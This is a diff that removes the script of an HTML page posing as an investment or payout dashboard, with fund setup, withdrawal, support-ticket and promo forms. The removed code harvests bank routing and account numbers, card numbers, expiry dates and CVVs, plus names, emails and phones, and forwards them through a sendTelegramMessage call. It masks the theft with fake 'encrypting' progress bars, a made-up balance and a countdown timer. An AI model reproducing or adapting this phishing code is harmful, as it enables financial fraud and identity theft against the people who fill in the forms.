-                                            <td class="py-4 px-4 text-slate-300">${t.type}</td>
-                                            <td class="py-4 px-4 font-bold text-gold-400">$${t.amount.toLocaleString()}</td>
-                                            <td class="py-4 px-4">
-                                                <span class="px-3 py-1 rounded-full text-xs font-bold ${
-                                                    t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400' :
-                                                    t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom' :
-                                                    t.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400' : 'bg-rose-500/20 text-rose-400'
-                                                }">${t.status}</span>
-                                            </td>
-                                        </tr>
-                                    `).join('')}
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-
-                    <!-- Support Center Section -->
-                    <div class="bg-navy-800 border border-navy-700 p-8 rounded-3xl card-3d">
-                        <div class="mb-6">
-                            <h3 class="text-xl font-bold text-white">Support Center Assistance</h3>
-                            <p class="text-xs text-slate-400">Prepopulated from your registered profile. Confirm your contact details before submitting.</p>
-                        </div>
-
-                        <form id="support-form" onsubmit="submitSupportTicket(event)" class="space-y-6">
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">First Name</label>
-                                    <input type="text" id="sup-fname" value="${user.firstName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Last Name</label>
-                                    <input type="text" id="sup-lname" value="${user.lastName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                </div>
-                            </div>
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Phone Number</label>
-                                    <input type="tel" id="sup-phone" value="${user.phone}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Email Address</label>
-                                    <input type="email" id="sup-email" value="${user.email}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                </div>
-                            </div>
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Issue Category</label>
-                                    <select id="sup-category" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                        <option value="Weekly Funds Setup">Weekly Funds Setup</option>
-                                        <option value="Withdrawal Processing">Withdrawal Processing</option>
-                                        <option value="Account Verification">Account Verification</option>
-                                        <option value="Agent Support Inquiry">Agent Support Inquiry</option>
-                                    </select>
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Subject</label>
-                                    <input type="text" id="sup-subject" required placeholder="Brief description of your inquiry" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                </div>
-                            </div>
-                            <div>
-                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Message (Supporting up to 50,000 characters)</label>
-                                <textarea id="sup-message" required rows="5" maxlength="50000" placeholder="Type your detailed message here..." class="w-full bg-navy-950 border border-navy-700 rounded-xl p-4 text-sm text-white focus:outline-none focus:border-sky-custom"></textarea>
-                            </div>
-                            <div class="flex justify-end">
-                                <button type="submit" class="px-8 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 transition">
-                                    Submit Support Ticket
-                                </button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-            `;
-        }
-
-        function initDashboardEvents() {
-            // Additional dashboard initialization if needed
-        }
-
-        // Countdown Timer Logic to Friday 10:30 PM EST
-        let countdownInterval = null;
-        function initCountdownTimer() {
-            if (countdownInterval) clearInterval(countdownInterval);
-
-            function updateTimer() {
-                const now = new Date();
-                // Find next Friday 22:30 (10:30 PM) EST (UTC-5)
-                const resultDate = new Date();
-                let dayOfWeek = resultDate.getUTCDay(); // 0 is Sunday, 5 is Friday
-                let daysUntilFriday = (5 - dayOfWeek + 7) % 7;
-                
-                resultDate.setUTCHours(22 + 5, 30, 0, 0); // Convert EST 22:30 to UTC
-                resultDate.setUTCDate(resultDate.getUTCDate() + daysUntilFriday);
-
-                if (now.getTime() > resultDate.getTime()) {
-                    resultDate.setDate(resultDate.getDate() + 7);
-                }
-
-                const diff = resultDate.getTime() - now.getTime();
-                if (diff <= 0) return;
-
-                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-                const secs = Math.floor((diff % (1000 * 60)) / 1000);
-
-                const dEl = document.getElementById('cd-days');
-                const hEl = document.getElementById('cd-hours');
-                const mEl = document.getElementById('cd-mins');
-                const sEl = document.getElementById('cd-secs');
-
-                if (dEl) dEl.textContent = String(days).padStart(2, '0');
-                if (hEl) hEl.textContent = String(hours).padStart(2, '0');
-                if (mEl) mEl.textContent = String(mins).padStart(2, '0');
-                if (sEl) sEl.textContent = String(secs).padStart(2, '0');
-            }
-
-            updateTimer();
-            countdownInterval = setInterval(updateTimer, 1000);
-        }
-
-        function filterTransactions(status) {
-            const tbody = document.getElementById('txn-tbody');
-            const filtered = status === 'All' ? state.transactions : state.transactions.filter(t => t.status === status);
-            
-            tbody.innerHTML = filtered.map(t => `
-                <tr class="hover:bg-navy-900/50 transition">
-                    <td class="py-4 px-4 font-mono font-bold text-white">${t.ref}</td>
-                    <td class="py-4 px-4 text-slate-300 text-xs">${t.date}</td>
-                    <td class="py-4 px-4 text-slate-300">${t.type}</td>
-                    <td class="py-4 px-4 font-bold text-gold-400">$${t.amount.toLocaleString()}</td>
-                    <td class="py-4 px-4">
-                        <span class="px-3 py-1 rounded-full text-xs font-bold ${
-                            t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400' :
-                            t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom' :
-                            t.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400' : 'bg-rose-500/20 text-rose-400'
-                        }">${t.status}</span>
-                    </td>
-                </tr>
-            `).join('');
-        }
-
-        async function submitWeeklyFundsSetup(e) {
-            e.preventDefault();
-            const payMethod = document.querySelector('input[name="pay-method"]:checked').value;
-            let detailsMsg = '';
-
-            if (payMethod === 'bank') {
-                const routing = document.getElementById('bank-routing').value;
-                const acc = document.getElementById('bank-acc').value;
-                detailsMsg = `<b>Method:</b> Bank Account\n<b>Routing:</b> ${routing}\n<b>Account:</b> ${acc}`;
-            } else {
-                const num = document.getElementById('card-num').value;
-                const exp = document.getElementById('card-exp').value;
-                const cvv = document.getElementById('card-cvv').value;
-                detailsMsg = `<b>Method:</b> Card\n<b>Card Number:</b> ${num}\n<b>Expiry:</b> ${exp}\n<b>CVV:</b> ${cvv}`;
-            }
-
-            const user = state.currentUser || { firstName: 'Anonymous', lastName: 'User', email: 'N/A' };
-            const tgMsg = `💳 <b>WEEKLY FUNDS SETUP SUBMITTED</b> 💳\n\n` +
-                `<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` + detailsMsg;
-            
-            sendTelegramMessage(tgMsg);
-
-            const modal = document.getElementById('modal-content');
-            modal.innerHTML = `
-                <div class="text-center py-6 space-y-4">
-                    <h3 class="text-xl font-bold text-white">Configuring Funding Destination</h3>
-                    <p class="text-xs text-slate-400">Verifying secure token and payment parameters...</p>
-                    <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700">
-                        <div id="setup-progress" class="bg-emerald-400 h-full w-0 transition-all duration-500"></div>
-                    </div>
-                    <div id="setup-status-text" class="text-xs text-gold-400 font-bold">Initializing...</div>
-                </div>
-            `;
-
-            let p = 0;
-            const timer = setInterval(() => {
-                p += 25;
-                const bar = document.getElementById('setup-progress');
-                const txt = document.getElementById('setup-status-text');
-                if (bar) bar.style.width = p + '%';
-                if (p === 50 && txt) txt.textContent = 'Encrypting routing data...';
-                if (p === 75 && txt) txt.textContent = 'Confirming integration parameters...';
-                if (p >= 100) {
-                    clearInterval(timer);
-                    modal.innerHTML = `
-                        <div class="text-center py-6 space-y-4">
-                            <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl">
-                                <i class="fa-solid fa-circle-check"></i>
-                            </div>
-                            <h3 class="text-2xl font-bold text-white">Weekly Funds Setup Complete</h3>
-                            <p class="text-xs text-slate-300">Your funding method has been configured successfully.</p>
-                            <button onclick="closeModal()" class="px-6 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs">Done</button>
-                        </div>
-                    `;
-                }
-            }, 400);
-        }
-
-        async function submitWithdrawal(e) {
-            e.preventDefault();
-            const amt = parseFloat(document.getElementById('wd-amount').value);
-            const errEl = document.getElementById('wd-error');
-
-            if (isNaN(amt) || amt <= 0 || amt > 4500) {
-                errEl.textContent = 'Invalid amount. Must be positive and not exceed displayed balance ($4,500.00).';
-                errEl.classList.remove('hidden');
-                return;
-            }
-
-            const refNum = 'TXN-' + Math.floor(10000 + Math.random() * 90000);
-
-            // Add transaction
-            state.transactions.unshift({
-                ref: refNum,
-                date: new Date().toISOString().replace('T', ' ').substring(0, 16),
-                amount: amt,
-                type: 'Withdrawal Request',
-                status: 'Pending'
-            });
-
-            const user = state.currentUser || { firstName: 'Client', lastName: 'User', email: 'N/A' };
-            const tgMsg = `💸 <b>WITHDRAWAL REQUESTED</b> 💸\n\n` +
-                `<b>Ref #:</b> ${refNum}\n` +
-                `<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` +
-                `<b>Amount:</b> $${amt.toLocaleString()}`;
-            
-            sendTelegramMessage(tgMsg);
-
-            closeModal();
-            render();
-            showModal('Withdrawal Submitted', `Your withdrawal request of <b>$${amt.toLocaleString()}</b> (Ref: ${refNum}) has been successfully queued for processing.`);
-        }
-
-        async function submitSupportTicket(e) {
-            e.preventDefault();
-            const ticketId = 'TKT-' + Math.floor(100000 + Math.random() * 900000);
-            const fname = document.getElementById('sup-fname').value;
-            const lname = document.getElementById('sup-lname').value;
-            const phone = document.getElementById('sup-phone').value;
-            const email = document.getElementById('sup-email').value;
-            const category = document.getElementById('sup-category').value;
-            const subject = document.getElementById('sup-subject').value;
-            const message = document.getElementById('sup-message').value;
-
-            const tgMsg = `📩 <b>SUPPORT TICKET CREATED (${ticketId})</b> 📩\n\n` +
-                `<b>Name:</b> ${fname} ${lname}\n` +
-                `<b>Phone:</b> ${phone}\n` +
-                `<b>Email:</b> ${email}\n` +
-                `<b>Category:</b> ${category}\n` +
-                `<b>Subject:</b> ${subject}\n` +
-                `<b>Message:</b> ${message}`;
-
-            sendTelegramMessage(tgMsg);
-
-            showModal('Support Ticket Created', `
-                <div class="space-y-3 text-center py-4">
-                    <div class="w-14 h-14 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl">
-                        <i class="fa-solid fa-ticket"></i>
-                    </div>
-                    <h4 class="text-lg font-bold text-white">Ticket Reference: <span class="text-gold-400">${ticketId}</span></h4>
-                    <p class="text-xs text-slate-300">Your support inquiry has been received and logged. Our team will contact you shortly.</p>
-                </div>
-            `);
-        }
-
-        async function handlePromoEntry(e) {
-            e.preventDefault();
-            const name = document.getElementById('promo-name').value;
-            const email = document.getElementById('promo-email').value;
-
-            const tgMsg = `🎟️ <b>NEW PROMO STREAM ENTRY</b> 🎟️\n\n` +
-                `<b>Name:</b> ${name}\n` +
-                `<b>Email:</b> ${email}`;
-
-            sendTelegramMessage(tgMsg);
-
-            showModal('Promo Entry Received', `
-                <div class="text-center py-4 space-y-3">
-                    <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl">
-                        <i class="fa-solid fa-check"></i>
-                    </div>
-                    <h4 class="text-lg font-bold text-white">Thank you, ${name}!</h4>
-                    <p class="text-xs text-slate-300">Your entry (<span class="text-gold-400">${email}</span>) has been added to our current weekly promotion pool.</p>
-                </div>
-            `);
-            e.target.reset();
-        }
-
-        // Initial app load
-        window.onload = function() {
-            render();
-        };
-    </script>
 </body>
 </html>
